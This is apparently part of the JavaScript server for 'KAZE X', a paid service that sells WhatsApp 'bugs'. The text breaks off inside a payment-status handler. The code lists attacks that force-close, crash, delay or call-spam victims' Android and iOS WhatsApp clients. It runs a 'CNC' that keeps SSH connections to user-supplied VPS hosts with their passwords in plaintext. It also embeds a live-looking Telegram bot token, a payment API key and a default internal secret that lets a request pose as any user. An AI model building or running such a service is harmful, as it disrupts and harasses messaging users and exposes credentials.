
const { webcrypto } = require('crypto');
const { File: NodeFile, Blob: NodeBlob } = require('buffer');
if (!globalThis.crypto) globalThis.crypto = webcrypto;
if (!globalThis.File && NodeFile) globalThis.File = NodeFile;
if (!globalThis.Blob && NodeBlob) globalThis.Blob = NodeBlob;

if (typeof global.gc === "function") {
    setInterval(() => { try { global.gc(); } catch { } }, 30 * 60 * 1000);
}

const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
const waitingInput = new Map()
process.on('unhandledRejection', (reason) => {
    const msg = reason?.message || String(reason);
    if (!msg.includes('Connection Closed') && !msg.includes('Timed Out') && !msg.includes('Stream Errored')) {
        console.error('[unhandledRejection]', msg);
    }
});

process.on('uncaughtException', (err) => {
    if (err.message && err.message.includes('WebSocket was closed before the connection was established')) return;
    console.error('[uncaughtException]', err.message, err.stack?.split('\n')[1] || '');
    setTimeout(() => process.exit(1), 1000);
});

process.on('warning', (warning) => {
    if (warning.name === 'PromiseRejectionHandledWarning') return;
    console.warn(warning.name, warning.message, warning.stack);
});

process.stdout.write = (chunk, encoding, callback) => {
    const str = typeof chunk === 'string' ? chunk : (chunk ? chunk.toString() : '');
    if (
        str.includes('Closing stale open session') ||
        str.includes('Closing session') ||
        str.includes('Failed to decrypt message') ||
        str.includes('Session error') ||
        str.includes('Closing open session') ||
        str.includes('Removing old closed') ||
        str.includes('Connection Closed') ||
        str.includes('Precondition Required') ||
        str.includes('minimum Redis version') ||
        str.includes('WebSocket was closed before the connection') ||
        str.includes('Current:')
    ) return true;
    return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
    const str = typeof chunk === 'string' ? chunk : (chunk ? chunk.toString() : '');
    if (
        str.includes('Closing stale open session') ||
        str.includes('Closing session:') ||
        str.includes('Failed to decrypt message') ||
        str.includes('Session error:') ||
        str.includes('Closing open session') ||
        str.includes('Removing old closed') ||
        str.includes('Connection Closed') ||
        str.includes('Precondition Required') ||
        str.includes('minimum Redis version') ||
        str.includes('WebSocket was closed before the connection') ||
        str.includes('Current:')
    ) return true;
    return originalStderrWrite(chunk, encoding, callback);
};
const safeExit = process.exit;

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const globalProxyAgent = null;  // Fixed: Direct connection without proxy (socks5://127.0.0.1:40000 was not available)
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsp = require('fs').promises;
const path = require('path');
const pino = require('pino');
const { exec } = require('child_process');
const cors = require('cors');
const P = require('pino')
const archiver = require("archiver")
const unzipper = require("unzipper")
const axios = require('axios')
const vm = require('vm')
const chalk = require("chalk");
const os = require('os');
const bodyParser = require('body-parser');
const { Api, TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const input = require('input');
const WebSocket = require('ws');
const multer = require('multer');
const http = require('http');
const server = http.createServer(app); // backend HTTP

app.use(cors()); // Enable CORS untuk semua origin
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));
app.use(bodyParser.json({ limit: '50mb' }));
const wss = new WebSocket.Server({
    server,
    path: '/ws'
});


let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const MAX_CHAT_LIST = 10000;
let _dbCache = null;
let _dbCacheTime = 0;
const DB_CACHE_TTL = 5000;
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = require("path").join(__dirname, "database.json");
const ACTIVE_KEYS_FILE = path.join(__dirname, "activeKeys.json");
if (!fs.existsSync(ACTIVE_KEYS_FILE)) fs.writeFileSync(ACTIVE_KEYS_FILE, "{}");
let activeKeys = (() => { try { return JSON.parse(fs.readFileSync(ACTIVE_KEYS_FILE, "utf8")); } catch { return {}; } })();
function reloadActiveKeys() {
    try {
        if (!fs.existsSync(ACTIVE_KEYS_FILE)) return;
        const raw = fs.readFileSync(ACTIVE_KEYS_FILE, "utf8");
        if (!raw.trim()) return;
        const data = JSON.parse(raw);
        const now = Date.now();
        let updated = false;
        for (const k of Object.keys(data)) {
            if (data[k].expires > now) {
                if (JSON.stringify(activeKeys[k]) !== JSON.stringify(data[k])) {
                    activeKeys[k] = data[k];
                    updated = true;
                }
            } else {
                if (activeKeys[k]) {
                    delete activeKeys[k];
                    updated = true;
                }
            }
        }
        const keyList = loadKeyList();
        for (const k of keyList) {
            const token = k.sessionKey;
            if (token && (!activeKeys[token] || activeKeys[token].expires <= now)) {
                activeKeys[token] = {
                    username: k.username,
                    created: now,
                    expires: now + 30 * 24 * 60 * 60 * 1000
                };
                updated = true;
            }
        }

        if (updated) {
            saveActiveKeys();
        }
    } catch (e) {

    }
}
function saveActiveKeys() {
    try {
        let diskData = {};
        if (fs.existsSync(ACTIVE_KEYS_FILE)) {
            try { diskData = JSON.parse(fs.readFileSync(ACTIVE_KEYS_FILE, "utf8")); } catch { }
        }
        const merged = { ...diskData, ...activeKeys };
        const now = Date.now();
        for (const k of Object.keys(merged)) {
            if (merged[k].expires < now) delete merged[k];
        }
        fs.writeFileSync(ACTIVE_KEYS_FILE, JSON.stringify(merged));
    } catch { }
}
let _akWatchDebounce = null;
fs.watch(ACTIVE_KEYS_FILE, () => {
    clearTimeout(_akWatchDebounce);
    _akWatchDebounce = setTimeout(reloadActiveKeys, 80);
});
setInterval(reloadActiveKeys, 10000); // 10s — kurangi load CPU
setInterval(function () { try { saveActiveKeys(); } catch { } }, 5000);
setInterval(function () {
    const now = Date.now(); let changed = false;
    for (const k in activeKeys) { if (activeKeys[k].expires && activeKeys[k].expires < now) { delete activeKeys[k]; changed = true; } }
    if (changed) saveActiveKeys();
}, 5 * 60 * 1000);
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
    { bug_id: "cspam", bug_name: "DELAY AMAN UNTUK NOKOS" },
    { bug_id: "cspamxx", bug_name: "DELAY VISIB" },
    { bug_id: "cxinv", bug_name: "FC INVISIBLE ANDROID" },
    { bug_id: "invisible", bug_name: "DELAY INVISIBLE" },
    { bug_id: "invisiblex", bug_name: "DELAY V3" },
    { bug_id: "ios_invis", bug_name: "FC IOS INVISIBLE" },
    { bug_id: "android", bug_name: "CRASH UI" },
    { bug_id: "spam_call", bug_name: "SPAM CALL" },
    { bug_id: "click", bug_name: "CRASH CLICK" }


];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
let vpsReconnectCount = {};
const VPS_MAX_RECONNECT = 10;
const VPS_FILE = 'vps.json';
let sikmanuk = (() => { try { return JSON.parse(fs.readFileSync("keyList.json", "utf8")); } catch { return []; } })();
function syncSikmanuk() { try { sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8")); } catch { } }
let _sikDebounce = null;
fs.watch("keyList.json", () => { clearTimeout(_sikDebounce); _sikDebounce = setTimeout(syncSikmanuk, 80); });
setInterval(syncSikmanuk, 10000); // 10s — kurangi load CPU

const cooldownStore = {};


if (fs.existsSync(CHAT_FILE)) {
    chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}


function saveChat() {
    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}


function sanitize(input) {
    return String(input)
        .replace(/[<>]/g, '') // hilangkan tag html
        .replace(/[\r\n]/g, ' ') // hilangkan newline
        .slice(0, 250); // batas 250 karakter
}

const TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '8696973586:AAEkgdHWydMrxjKfb0FLLX-fPN8lZAnRpaE').trim();


const _workerName = process.env.name || process.env.WORKER_NAME || '';
let _workerId = 1;
if (process.env.WORKER_ID) _workerId = parseInt(process.env.WORKER_ID);
else if (_workerName.includes('W2')) _workerId = 2;

function createDisabledTelegramBot() {
    const noop = () => Promise.resolve({});
    return {
        on: () => undefined,
        onText: () => undefined,
        sendMessage: noop,
        sendPhoto: noop,
        sendDocument: noop,
        sendLocation: noop,
        editMessageText: noop,
        answerCallbackQuery: noop,
        getChatMember: () => Promise.resolve({ status: 'left' }),
        getFile: () => Promise.resolve({ file_path: '' }),
        getFileLink: () => Promise.resolve(''),
        setMyName: noop,
    };
}

const bot = TOKEN
    ? (_workerId === 1
        ? new TelegramBot(TOKEN, { polling: true })
        : new TelegramBot(TOKEN, { polling: false }))
    : createDisabledTelegramBot();

if (TOKEN) {
    bot.setMyName({ name: process.env.TELEGRAM_BOT_NAME || 'KAZE X' })
        .then(() => console.log('[TG] Bot name set to KAZE X'))
        .catch((error) => console.error('[TG NAME]', error.message?.slice(0, 200)));
} else {
    console.warn('[TG] TELEGRAM_BOT_TOKEN belum diatur. Fitur Telegram dinonaktifkan.');
}

bot.on('polling_error', (err) => {
    console.error('[TG POLLING]', err.code, err.message?.slice(0, 200));
});

bot.on('error', (err) => {
    console.error('[TG ERROR]', err.message?.slice(0, 200));
});

const OWNER_ID = Number(process.env.TELEGRAM_ADMIN_ID || 0);


const KEY_PATH = path.join(__dirname, "keyList.json")
const VPS_PATH = path.join(__dirname, "vps.json")

wss.on("connection", function (ws, req) {
    let username = null
    let sessionInterval = null

    ws.on("message", async function (msg) {
        try {
            const data = JSON.parse(msg)

            if (data.type === "sessionCheck") {
                syncSikmanuk();
                reloadActiveKeys();

                const proxySecret = req.headers['x-internal-secret'];
                const proxyUsername = req.headers['x-proxy-username'] ? decodeURIComponent(req.headers['x-proxy-username']) : undefined;
                const isTrustedProxy = proxySecret === (process.env.INTERNAL_SECRET || 'otax_internal_2024') && proxyUsername;

                let user = sikmanuk.find(e => e.sessionKey === data.key);
                let ak = activeKeys[data.key];


                if (!ak && !isTrustedProxy) {
                    await new Promise(r => setTimeout(r, 400));
                    reloadActiveKeys();
                    ak = activeKeys[data.key];
                }

                let userInDb = null;
                if (isTrustedProxy) {
                    const db = (() => { try { return JSON.parse(fs.readFileSync("database.json", "utf8")); } catch { return []; } })();
                    userInDb = db.find(u => u.username.trim().toLowerCase() === proxyUsername.trim().toLowerCase());
                    if (userInDb) {
                        ws._proxyUser = proxyUsername;
                        ws._proxyRole = req.headers['x-proxy-role'] || 'MEMBER';
                    }
                } else if (user || ak) {
                    const db = (() => { try { return JSON.parse(fs.readFileSync("database.json", "utf8")); } catch { return []; } })();
                    const checkUsername = (user && user.username) ? user.username : (ak && ak.username ? ak.username : null);
                    if (checkUsername) {
                        userInDb = db.find(u => u.username.trim().toLowerCase() === checkUsername.trim().toLowerCase());
                    }
                }

                const validInAk = (ak && ak.expires > Date.now() && userInDb) || (isTrustedProxy && userInDb);
                const validInSik = user && user.androidId === data.androidId && userInDb;
                if (!validInSik && !validInAk) {
                    ws.send(JSON.stringify({ type: "forceLogout", reason: "sessionInvalid" }));
                    ws.close();
                    return;
                }
            }

            if (data.type === "validate") {
                syncSikmanuk();
                reloadActiveKeys();

                const proxySecret = req.headers['x-internal-secret'];
                const proxyUsername = req.headers['x-proxy-username'] ? decodeURIComponent(req.headers['x-proxy-username']) : undefined;
                const isTrustedProxy = proxySecret === (process.env.INTERNAL_SECRET || 'otax_internal_2024') && proxyUsername;

                let user = sikmanuk.find(e => e.sessionKey === data.key);
                let ak = activeKeys[data.key];


                if (!ak && !isTrustedProxy) {
                    await new Promise(r => setTimeout(r, 400));
                    reloadActiveKeys();
                    ak = activeKeys[data.key];
                }

                if (!user && ak && ak.expires > Date.now()) {
                    user = { sessionKey: data.key, username: ak.username, androidId: data.androidId, role: "member" };
                }

                if (!user && isTrustedProxy) {
                    user = { sessionKey: data.key, username: proxyUsername, androidId: data.androidId, role: req.headers['x-proxy-role'] || "member" };
                }

                let userInDb = null;
                if (user && user.username) {
                    const db = (() => { try { return JSON.parse(fs.readFileSync("database.json", "utf8")); } catch { return []; } })();
                    userInDb = db.find(u => u.username.trim().toLowerCase() === user.username.trim().toLowerCase());
                }

                if (!user || ((!ak || ak.expires < Date.now()) && !isTrustedProxy) || !userInDb) {
                    ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "keyInvalid" }));
                    ws.close();
                    return;
                }
                ws.send(JSON.stringify({
                    type: "myInfo", valid: true,
                    username: user.username,
                    androidId: user.androidId || data.androidId,
                    role: userInDb ? userInDb.role : (user.role || "member")
                }));
                if (sessionInterval) clearInterval(sessionInterval);
                sessionInterval = setInterval(function () {
                    try {
                        reloadActiveKeys();
                        const checkAk = activeKeys[data.key];
                        let checkDb = null;
                        if (checkAk && checkAk.username) {
                            const db = (() => { try { return JSON.parse(fs.readFileSync("database.json", "utf8")); } catch { return []; } })();
                            checkDb = db.find(u => u.username.trim().toLowerCase() === checkAk.username.trim().toLowerCase());
                        }
                        if (!checkAk || checkAk.expires < Date.now() || !checkDb) {
                            ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "sessionExpired" }));
                            ws.close();
                        }
                    } catch { }
                }, 15000);
            }

            if (data.type === "auth") {
                const user = sikmanuk.find(e => e.sessionKey === data.key)

                if (!user || user.androidId !== data.androidId) {
                    ws.close()
                    return
                }

                username = user.username
                wsClients[username] = ws

                const list = chatList
                    .filter(m => m.from === username || m.to === username)
                    .map(m => (m.from === username ? m.to : m.from))

                ws.send(JSON.stringify({
                    type: "chatList",
                    users: [...new Set(list)]
                }))
            }

            if (data.type === "chat") {
                if (!username) return

                const to = data.to
                const message = sanitize(data.message)

                if (!to || !message || message.length > 250) return

                const chat = {
                    from: username,
                    to,
                    message,
                    time: new Date().toISOString()
                }

                chatList.push(chat)
                if (chatList.length > MAX_CHAT_LIST) chatList = chatList.slice(-MAX_CHAT_LIST);
                saveChat()

                ws.send(JSON.stringify({
                    type: "chat",
                    message: { ...chat, fromMe: true }
                }))

                if (wsClients[to]) {
                    wsClients[to].send(JSON.stringify({
                        type: "chat",
                        message: { ...chat, fromMe: false }
                    }))
                }
            }

            if (data.type === "getMessages") {
                if (!username) return

                const withUser = data.with
                const messages = chatList
                    .filter(m =>
                        (m.from === username && m.to === withUser) ||
                        (m.from === withUser && m.to === username)
                    )
                    .map(m => ({
                        ...m,
                        fromMe: m.from === username
                    }))

                ws.send(JSON.stringify({
                    type: "messages",
                    with: withUser,
                    messages
                }))
            }

        } catch {
            ws.close()
        }
    })

    ws.on("close", () => {
        if (sessionInterval) clearInterval(sessionInterval)
        if (username && wsClients[username]) delete wsClients[username]
    })
})

const PORT = parseInt(process.env.PORT || process.env.API_PORT || process.env.WS_PORT || '11553', 10);
let wsPort = PORT;
server.timeout = 60000;
server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;
function checkAndInstallDependencies() {
    // Disabled: apt-get tidak tersedia di Pterodactyl container
    // Java dan Apktool harus sudah tersedia atau diinstall manual
    console.log('[SYSTEM] checkAndInstallDependencies skipped (non-root container)');
}

server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        const fallbackPort = wsPort + 1;
        console.log(`⚠️  Port ${wsPort} sedang dipakai. Beralih ke port ${fallbackPort}...`);
        setTimeout(() => {
            wsPort = fallbackPort;
            server.listen(wsPort);
        }, 3000);
    } else {
        console.error('[SERVER ERROR]', err.message);
    }
});

server.listen(wsPort, () => {
    console.log(`🟣 Server running on port ${wsPort}`);
    console.log(`🚀 Server aktif di http://0.0.0.0:${wsPort}`);
    checkAndInstallDependencies();
    if (typeof startUserSessions === 'function') startUserSessions();
})

app.use(express.urlencoded({ limit: '50mb', extended: true, parameterLimit: 50000 }))
app.use(express.json({ limit: '50mb' }))
const rateLimitMap = {};


setInterval(() => {
    const now = Date.now();
    for (const k in rateLimitMap) {
        const arr = rateLimitMap[k].filter(ts => now - ts < 1000);
        if (arr.length === 0) delete rateLimitMap[k];
        else rateLimitMap[k] = arr;
    }
}, 5 * 60 * 1000);

function rateLimiter(req, res, next) {
    const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
    if (!key) return next();

    const now = Date.now();
    if (!rateLimitMap[key]) rateLimitMap[key] = [];


    const arr = rateLimitMap[key];
    let i = 0;
    while (i < arr.length && now - arr[i] >= 1000) i++;
    if (i > 0) arr.splice(0, i);
    arr.push(now);

    if (arr.length > 10) {
        return res.status(200).json({
            valid: false,
            rateLimit: true,
            message: "Terlalu banyak permintaan! Coba lagi.",
        });
    }

    next();
}



const asyncHandler = fn => (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(err => {
        console.error('[ENDPOINT ERROR]', req.path, err.message);
        if (!res.headersSent) res.status(500).json({ valid: false, error: 'Internal server error' });
    });
};

app.use(rateLimiter);
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.header("Access-Control-Allow-Headers", "Content-Type, x-session-key, session-key");
    next();
});

app.use((req, res, next) => {
    const proxySecret = req.headers['x-internal-secret'];
    const proxyUsername = req.headers['x-proxy-username'] ? decodeURIComponent(req.headers['x-proxy-username']) : undefined;
    if (proxySecret === (process.env.INTERNAL_SECRET || 'otax_internal_2024') && proxyUsername) {
        req.proxyUser = proxyUsername;
        req.proxyRole = req.headers['x-proxy-role'] || 'MEMBER';
    }
    next();
});

if (fs.existsSync(KEY_FILE)) {
    try {
        const rawData = fs.readFileSync(KEY_FILE, 'utf8');
        const parsed = JSON.parse(rawData); // ini array

        const db = loadDatabase();
        const now = Date.now();
        let cleaned = 0;
        if (db.length === 0 && parsed.length > 0) {
            console.log("⚠️ Database kosong tapi keyList ada " + parsed.length + " entries — SKIP cleanup untuk safety");
            for (const user of parsed) {
                if (user.sessionKey && user.username && user.lastLogin) {
                    const created = new Date(user.lastLogin).getTime();
                    const expires = created + 30 * 24 * 60 * 60 * 1000;
                    if (expires < now) continue;
                    activeKeys[user.sessionKey] = { username: user.username, created, expires };
                }
            }
        } else {
            const validList = parsed.filter(function (user) {
                if (!user.username) return false;
                const exist = db.find(function (u) { return u.username === user.username; });
                if (!exist) { cleaned++; return false; }
                return true;
            });
            if (cleaned > 0) {
                fs.writeFileSync(KEY_FILE, JSON.stringify(validList, null, 2));
                console.log("Cleaned " + cleaned + " invalid from keyList");
            }
            for (const user of validList) {
                if (user.sessionKey && user.username && user.lastLogin) {
                    const created = new Date(user.lastLogin).getTime();
                    const expires = created + 30 * 24 * 60 * 60 * 1000;
                    if (expires < now) continue;
                    activeKeys[user.sessionKey] = { username: user.username, created, expires };
                }
            }
        }
        saveActiveKeys();
        console.log("activeKeys loaded: " + Object.keys(activeKeys).length + " sessions");
    } catch (err) {
        console.error("❌ Failed to load keyList.json:", err.message);
    }
}

function generateTempSessionId() {
    return crypto.randomBytes(16).toString('hex');
}
function connectToAllVPS() {
    if (!cncActive) return;

    console.log("🔄 Connecting to all VPS servers...");

    for (const vps of vpsList) {
        const host = vps.host || vps.ip;
        const user = vps.username || vps.user;
        if (!host || !user) {
            console.log(`❌ Invalid VPS config: ${JSON.stringify(vps)}`);
            continue;
        }
        const isValidIpOrDomain = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(host) || /^([a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$/.test(host) || host === "localhost";
        if (!isValidIpOrDomain) {
            console.log(`❌ Invalid host format skipped: ${host}`);
            continue;
        }

        if (vpsConnections[host]) {
            continue;
        }

        const conn = new Client();
        let isReady = false;

        conn.on('ready', () => {
            isReady = true;

            if (!cncActive) {
                conn.end();
                return;
            }

            console.log(`✅ Connected to VPS: ${vps.host}`);
            vpsConnections[vps.host] = conn;
            vpsReconnectCount[vps.host] = 0;
        });

        conn.on('error', (err) => {
            console.log(`❌ Failed ${vps.host}: ${err.message}`);
        });

        conn.on('close', () => {
            delete vpsConnections[vps.host];

            if (!isReady) {
                console.log(`❌ Unreachable: ${vps.host}`);
                return;
            }

            console.log(`🔌 Disconnected: ${vps.host}`);

            if (cncActive) {
                vpsReconnectCount[vps.host] = (vpsReconnectCount[vps.host] || 0) + 1;
                if (vpsReconnectCount[vps.host] < VPS_MAX_RECONNECT) {
                    const delay = Math.min(5000 * vpsReconnectCount[vps.host], 60000);
                    setTimeout(() => connectToAllVPS(), delay);
                } else {
                    console.log(`⛔ Max reconnect reached for ${vps.host}, skipping.`);
                }
            }
        });

        try {
            conn.connect({
                host: vps.host,
                username: vps.username,
                password: vps.password,
                readyTimeout: 5000
            });
        } catch (err) {
            console.log(`❌ Connect crash ${vps.host}: ${err.message}`);
        }
    }
}

function disconnectAllVPS() {
    console.log("🛑 Disconnecting all VPS connections...");
    cncActive = false;

    for (const host in vpsConnections) {
        try {
            vpsConnections[host].end();
        } catch { }
        delete vpsConnections[host];
    }
}

function loadVPSList() {
    try {
        if (!fs.existsSync(VPS_FILE)) {
            fs.writeFileSync(VPS_FILE, JSON.stringify([], null, 2));
        }
        vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8')).map(vps => {
            if (vps.ip && !vps.host) vps.host = vps.ip;
            if (vps.user && !vps.username) vps.username = vps.user;
            return vps;
        });
    } catch (err) {
        console.error("❌ Failed to load VPS list:", err.message);
        vpsList = [];
    }
}

if (fs.existsSync(VPS_FILE)) {
    loadVPSList();
    setTimeout(() => connectToAllVPS(), 1000);
}

fs.watch(VPS_FILE, () => {
    try {
        vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
        console.log("🔄 VPS list updated.");
        connectToAllVPS();
    } catch (e) {
        console.error("❌ Failed to update VPS list:", e.message);
    }
});


async function getUserByKey(key, req) {
    if (req && req.proxyUser) return req.proxyUser;
    if (!key) return null;

    reloadActiveKeys();
    let keyInfo = activeKeys[key];

    if (!keyInfo) {
        const keyList = loadKeyList();
        const found = keyList.find(k => k.sessionKey === key || k.key === key);
        if (found) {
            const nowMs = Date.now();
            activeKeys[key] = {
                username: found.username,
                created: nowMs,
                expires: nowMs + 30 * 24 * 60 * 60 * 1000
            };
            saveActiveKeys();
            keyInfo = activeKeys[key];
        }
    }

    if (!keyInfo) return null;
    if (keyInfo.expires && keyInfo.expires < Date.now()) {
        delete activeKeys[key];
        saveActiveKeys();
        return null;
    }

    const db = loadDatabase();
    const user = db.find(function (u) {
        return u.username && u.username.trim().toLowerCase() === keyInfo.username.trim().toLowerCase();
    });

    return user ? keyInfo.username : null;
}

app.get("/myServer", async (req, res) => {
    const key = req.query.key;
    const username = await getUserByKey(key, req);
    if (!username) return res.status(401).json({ error: "Invalid session key" });

    const userVPS = vpsList.filter(vps => vps.owner === username);
    res.json(userVPS);
});


app.post("/addServer", async (req, res) => {
    const { key, host, username: sshUser, password } = req.body;
    const owner = await getUserByKey(key, req);
    if (!owner) return res.status(401).json({ error: "Invalid session key" });

    if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

    const isValidIpOrDomain = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(host) || /^([a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$/.test(host);
    if (!isValidIpOrDomain) {
        return res.status(400).json({ error: "Format host/IP tidak valid" });
    }

    const newVPS = { host, username: sshUser, password, owner };
    vpsList.push(newVPS);
    fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
    res.json({ success: true, message: "VPS added" });
});


app.post("/delServer", async (req, res) => {
    const { key, host } = req.body;
    const owner = await getUserByKey(key, req);
    if (!owner) return res.status(401).json({ error: "Invalid session key" });

    const before = vpsList.length;
    vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
    fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

    const deleted = before !== vpsList.length;
    res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});
const TRANSACTIONS_FILE = path.join(__dirname, 'transactions.json');
if (!fs.existsSync(TRANSACTIONS_FILE)) {
    fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify([], null, 2));
}

const PAYMENT_KEYS_FILE = path.join(__dirname, 'payment_api_keys.json');
if (!fs.existsSync(PAYMENT_KEYS_FILE)) {
    fs.writeFileSync(PAYMENT_KEYS_FILE, JSON.stringify([], null, 2));
}
const PAYMENT_PROVIDER_URL = 'https://pg.ronzzyt.id/api/transaction';

function loadPaymentKeys() {
    try {
        const value = JSON.parse(fs.readFileSync(PAYMENT_KEYS_FILE, 'utf8'));
        return Array.isArray(value) ? value : [];
    } catch {
        return [];
    }
}

function savePaymentKeys(keys) {
    const tempFile = `${PAYMENT_KEYS_FILE}.tmp`;
    fs.writeFileSync(tempFile, JSON.stringify(keys, null, 2));
    fs.renameSync(tempFile, PAYMENT_KEYS_FILE);
}

function hashPaymentKey(key) {
    return crypto.createHash('sha256').update(key).digest('hex');
}

function generatePaymentApiKey() {
    return `KAZEX-${crypto.randomBytes(18).toString('base64url')}`;
}

function getPaymentKeyOwner(apiKey) {
    if (typeof apiKey !== 'string' || !/^KAZEX-[A-Za-z0-9_-]{20,60}$/.test(apiKey)) return null;
    const keyHash = hashPaymentKey(apiKey);
    const entry = loadPaymentKeys().find(item => item.key_hash === keyHash && item.active !== false);
    return entry || null;
}

function providerApiKey() {
    return String(process.env.RONZZY_API_KEY || 'RP-ad17a856-3095-4670-8948-40dc41075973').trim();
}

function normalizePaymentAmount(value) {
    const amount = Number(value);
    return Number.isSafeInteger(amount) && amount > 0 ? amount : null;
}

function transactionOwnerMatches(transaction, username) {
    return transaction && typeof transaction.username === 'string' &&
        transaction.username.trim().toLowerCase() === username.trim().toLowerCase();
}

const createQrisHandler = async (req, res) => {
    const input = { ...(req.query || {}), ...(req.body || {}) };
    const owner = getPaymentKeyOwner(input.api_key || input.key);
    if (!owner) return res.status(401).json({ success: false, message: 'API key user tidak valid' });

    const amount = normalizePaymentAmount(input.amount);
    const code = typeof input.code === 'string' && input.code.trim()
        ? input.code.trim().toLowerCase()
        : 'qris';
    const description = typeof input.description === 'string'
        ? input.description.trim().slice(0, 255)
        : '';
    const webhookUrl = typeof input.webhook_url === 'string'
        ? input.webhook_url.trim().slice(0, 500)
        : '';

    if (!amount || amount < 1000) {
        return res.status(400).json({ success: false, message: 'amount minimal 1000' });
    }
    if (!providerApiKey()) {
        return res.status(503).json({ success: false, message: 'Payment provider belum dikonfigurasi' });
    }
    if (webhookUrl && !/^https:\/\//i.test(webhookUrl)) {
        return res.status(400).json({ success: false, message: 'webhook_url harus menggunakan HTTPS' });
    }

    try {
        const response = await axios.post(`${PAYMENT_PROVIDER_URL}/create`, {
            api_key: providerApiKey(),
            code,
            amount,
            ...(description ? { description } : {}),
            ...(webhookUrl ? { webhook_url: webhookUrl } : {})
        }, { timeout: 15000, validateStatus: status => status >= 200 && status < 300 });

        const providerData = response.data;
        const providerTransaction = providerData?.data;
        if (!providerData?.status || !providerTransaction?.reff_id) {
            return res.status(502).json({ success: false, message: 'Provider gagal membuat transaksi' });
        }

        const transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE, 'utf8'));
        transactions.push({
            username: owner.username,
            reff_id: providerTransaction.reff_id,
            status: providerTransaction.status || 'pending',
            amount,
            created_at: new Date().toISOString(),
        });
        fs.writeFileSync(TRANSACTIONS_FILE, JSON.stringify(transactions, null, 2));

        return res.json({ ...providerData, author: 'KAZE X' });
    } catch (error) {
        console.error('[CREATE QRIS]', error.response?.status || error.code || error.message);
        return res.status(502).json({ success: false, message: 'Payment provider tidak dapat dihubungi' });
    }
};

app.post('/api/create-qris', createQrisHandler);
app.get('/api/create-qris', createQrisHandler);

const qrisOrderStatusHandler = async (req, res) => {
    const input = { ...(req.query || {}), ...(req.body || {}) };
    const owner = getPaymentKeyOwner(input.api_key || input.key);
    const reffId = typeof input.reff_id === 'string' ? input.reff_id.trim() : '';
    if (!owner) return res.status(401).json({ success: false, message: 'API key user tidak valid' });
    if (!reffId) return res.status(400).json({ success: false, message: 'reff_id wajib diisi' });

    const transactions = JSON.parse(fs.readFileSync(TRANSACTIONS_FILE, 'utf8'));
    const localTransaction = transactions.find(item => item.reff_id === reffId);
    if (!transactionOwnerMatches(localTransaction, owner.username)) {
        return res.status(404).json({ success: false, message: 'Transaksi tidak ditemukan' });
    }
    if (!providerApiKey()) {
        return res.status(503).json({ success: false, message: 'Payment provider belum dikonfigurasi' });
    }

    try {
